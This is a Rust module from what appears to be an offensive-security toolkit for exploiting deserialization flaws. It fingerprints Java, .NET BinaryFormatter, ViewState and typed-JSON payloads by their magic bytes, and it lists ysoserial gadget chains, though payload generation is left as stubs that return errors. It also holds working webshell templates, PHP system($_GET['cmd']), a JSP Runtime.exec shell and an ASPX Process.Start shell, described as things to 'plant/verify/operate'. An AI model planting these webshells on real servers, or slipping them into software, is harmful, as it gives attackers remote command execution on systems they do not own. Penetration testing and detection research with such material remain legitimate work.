//! Runtime widgets and tools for .NET and Java (user ruling): payload and
//! webshell helpers deserialization exploits reach for. Rust-native where
//! the ecosystem has it (byte-level magic, b64 markers, ysoserial-rs
//! chains), Java/.NET runtime integration where it does not.

use crate::error::Atom;

/// Serialized-data magic fingerprinting: identify the serialization family
/// of an untrusted blob (Java / .NET BinaryFormatter / ViewState / JSON
/// with $type) — pure, zero IO, no instantiation (the structural
/// gadget-chain isolation).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SerializedKind {
    /// Java native serialization: AC ED 00 05 (base64 rO0AB).
    JavaNative,
    /// .NET BinaryFormatter: 00 01 00 00 00 FF FF FF FF 01 00 00 00
    /// (base64 AAEAAAD).
    Nrbf,
    /// ASP.NET ViewState: /w or FF 01 prefix (ObjectStateFormatter).
    ViewState,
    /// JSON text carrying a $type field (Newtonsoft TypeNameHandling).
    JsonTyped,
    /// Unknown / not one of the dangerous families.
    Unknown,
}

/// Detect the serialization family of a binary payload.
pub fn serialized_kind(data: &[u8]) -> SerializedKind {
    if data.starts_with(&[0xac, 0xed, 0x00, 0x05]) {
        return SerializedKind::JavaNative;
    }
    if data.starts_with(&[
        0x00, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00,
    ]) {
        return SerializedKind::Nrbf;
    }
    if data.starts_with(b"/w") || data.starts_with(&[0xff, 0x01]) {
        return SerializedKind::ViewState;
    }
    let text = String::from_utf8_lossy(data);
    if (text.starts_with('{') || text.starts_with('[')) && text.contains("$type") {
        return SerializedKind::JsonTyped;
    }
    SerializedKind::Unknown
}

/// Detect the family of a base64-encoded payload (b64 markers, no decode
/// needed — the cheap first pass over traffic/cookie values).
pub fn serialized_kind_b64(text: &str) -> SerializedKind {
    let trimmed = text.trim();
    if trimmed.starts_with("rO0AB") {
        return SerializedKind::JavaNative;
    }
    if trimmed.starts_with("AAEAAAD") {
        return SerializedKind::Nrbf;
    }
    SerializedKind::Unknown
}

/// The Java gadget chains covered natively (ysoserial-rs crate embedding):
/// Rust generation, no Java runtime needed.
pub const NATIVE_JAVA_CHAINS: &[&str] = &[
    "cc1",
    "cc2",
    "cc3",
    "cc4",
    "cc5",
    "cc6",
    "cc7",
    "cck1",
    "cck2",
    "cck3",
    "cck4",
    "bs1",
    "spring1",
    "spring2",
    "hibernate1",
    "hibernate2",
    "jdk7u21",
    "jdk8u20",
    "groovy1",
    "clojure",
    "rome",
    "myfaces1",
    "json1",
    "url_dns",
];

/// A Java gadget chain payload — the ysoserial face. Native chains resolve
/// in-process; others route to the Java runtime tool at generate time.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct JavaPayload {
    chain: String,
    command: String,
}

impl JavaPayload {
    /// Bind a chain to a command. Chains outside the native set are still
    /// constructible — they route to the runtime tool at generate time.
    pub fn new(chain: impl Into<String>, command: impl Into<String>) -> Self {
        Self {
            chain: chain.into(),
            command: command.into(),
        }
    }

    pub fn chain(&self) -> &str {
        &self.chain
    }

    pub fn command(&self) -> &str {
        &self.command
    }

    pub fn is_native(&self) -> bool {
        NATIVE_JAVA_CHAINS.contains(&self.chain.as_str())
    }

    /// Generate the serialized payload bytes. Native chains resolve
    /// in-process (ysoserial-rs embed — heavy dep, ADR-gated); non-native
    /// chains route to the Java runtime (ysoserial.jar) — the caller gets
    /// an Atom when the wiring/runtime is absent.
    pub fn generate(&self) -> Result<Vec<u8>, Atom> {
        if self.is_native() {
            Err(Atom::soft_success(
                "E_GEN_001",
                "native chain wiring pending (ysoserial-rs embed, ADR-gated)",
            ))
        } else {
            Err(Atom::soft_success(
                "E_GEN_002",
                "non-native chain: route to ysoserial.jar (vf_init java gates this)",
            ))
        }
    }
}

/// Common .NET formatters (ysonet vocabulary).
pub const DOTNET_FORMATTERS: &[&str] = &[
    "BinaryFormatter",
    "LosFormatter",
    "ObjectStateFormatter",
    "NetDataContractSerializer",
    "SoapFormatter",
    "Json.Net",
];

/// A .NET gadget payload — ysoserial.net/ysonet chains (runtime tool only;
/// no Rust-native generator for the .NET side exists yet).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DotnetPayload {
    formatter: String,
    gadget: String,
    command: String,
}

impl DotnetPayload {
    pub fn new(
        formatter: impl Into<String>,
        gadget: impl Into<String>,
        command: impl Into<String>,
    ) -> Self {
        Self {
            formatter: formatter.into(),
            gadget: gadget.into(),
            command: command.into(),
        }
    }

    pub fn formatter(&self) -> &str {
        &self.formatter
    }

    /// .NET payload generation routes to the runtime tool — the Atom carries
    /// the gate reason.
    pub fn generate(&self) -> Result<Vec<u8>, Atom> {
        Err(Atom::soft_success(
            "E_GEN_003",
            "dotnet generation routes to ysoserial.net/ysonet (vf_init dotnet gates this)",
        ))
    }
}

/// A planted webshell declaration (user ruling: a dedicated webshell
/// library) — kind + template + drive face. Plant/verify/operate.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum WebshellKind {
    /// PHP system() GET one-liner (cheat-sheet vocabulary).
    PhpGet,
    PhpPost,
    /// JSP / servlet shells.
    Jsp,
    /// ASP / ASPX (Windows/IIS targets).
    Aspx,
}

impl WebshellKind {
    /// The minimal shell file content for the kind — the seed of the
    /// webshell library's template face.
    pub fn template(&self) -> &'static str {
        match self {
            WebshellKind::PhpGet => "<?php system($_GET['cmd']); ?>",
            WebshellKind::PhpPost => "<?php system($_POST['cmd']); ?>",
            WebshellKind::Jsp => "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
            WebshellKind::Aspx => "<%=System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(\"cmd\",\"/c \"+Request[\"cmd\"]){UseShellExecute=false,RedirectStandardOutput=true}.StandardOutput.ReadToEnd())%>",
        }
    }

    /// The request face: how a command rides the planted file.
    pub fn drive_query(&self) -> &'static str {
        match self {
            WebshellKind::PhpGet | WebshellKind::Jsp | WebshellKind::Aspx => "cmd",
            WebshellKind::PhpPost => "cmd (POST body)",
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn java_magic_is_detected() {
        assert_eq!(
            serialized_kind(&[0xac, 0xed, 0x00, 0x05, 0x73, 0x72]),
            SerializedKind::JavaNative
        );
    }

    #[test]
    fn nrbf_magic_is_detected() {
        assert_eq!(
            serialized_kind(&[
                0x00, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, 0x00
            ]),
            SerializedKind::Nrbf
        );
    }

    #[test]
    fn viewstate_prefix_is_detected() {
        assert_eq!(serialized_kind(b"/wEPDwUK"), SerializedKind::ViewState);
        assert_eq!(
            serialized_kind(&[0xff, 0x01, 0x00]),
            SerializedKind::ViewState
        );
    }

    #[test]
    fn json_typed_is_detected() {
        assert_eq!(
            serialized_kind(b"{\"$type\": \"System.IO.FileInfo, mscorlib\", \"x\": 1}"),
            SerializedKind::JsonTyped
        );
        assert_eq!(
            serialized_kind(b"{\"plain\": \"json\"}"),
            SerializedKind::Unknown
        );
    }

    #[test]
    fn b64_markers_without_decoding() {
        assert_eq!(
            serialized_kind_b64("rO0ABXNyABFqYXZhLmxhbmc="),
            SerializedKind::JavaNative
        );
        assert_eq!(serialized_kind_b64("AAEAAAD/////"), SerializedKind::Nrbf);
        assert_eq!(serialized_kind_b64("plainstring"), SerializedKind::Unknown);
    }

    #[test]
    fn native_chain_coverage_is_the_ysoserial_rs_set() {
        assert!(JavaPayload::new("cc1", "id").is_native());
        assert!(!JavaPayload::new("some_new_chain", "id").is_native());
        assert!(JavaPayload::new("cc1", "id").generate().is_err());
    }

    #[test]
    fn dotnet_payload_routes_to_runtime() {
        let p = DotnetPayload::new("BinaryFormatter", "TypeConfuseDelegate", "calc");
        assert_eq!(p.formatter(), "BinaryFormatter");
        assert!(p.generate().is_err());
    }

    #[test]
    fn webshell_templates_are_the_cheat_sheet_one_liners() {
        assert!(WebshellKind::PhpGet
            .template()
            .contains("system($_GET['cmd'])"));
        assert_eq!(WebshellKind::PhpGet.drive_query(), "cmd");
        assert!(WebshellKind::Jsp
            .template()
            .contains("Runtime.getRuntime().exec"));
    }
}
